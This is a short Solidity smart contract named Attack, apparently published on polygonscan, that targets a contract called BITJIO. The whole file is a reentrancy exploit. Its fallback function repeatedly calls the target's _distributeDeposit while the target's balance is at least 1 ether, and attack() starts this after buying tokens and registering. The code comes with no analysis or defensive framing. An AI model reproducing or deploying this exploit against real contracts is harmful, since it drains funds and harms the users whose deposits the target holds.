/**
 *Submitted for verification at polygonscan.com on 2023-05-22
*/

// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

contract Attack {
    BITJIO public bitjio;

    constructor(address _bitjioAddress) {
        bitjio = BITJIO(_bitjioAddress);
    }

    // Fallback is called when BITJIO sends Ether to this contract.
    fallback() external payable {
        if (address(bitjio).balance >= 1 ether) {
            bitjio._distributeDeposit(msg.sender, 1 ether);
        }
    }

    receive() external payable {}

    function attack() external payable {
        require(msg.value >= 1 ether);
        bitjio.buyToken();
        bitjio.registration(address(this), address(this), 1);
    }
}

interface BITJIO {
    function _distributeDeposit(address _owner, uint256 _value) external;
    function buyToken() external payable;
    function registration(address _owner, address _referrer, uint256 _userId) external payable;
}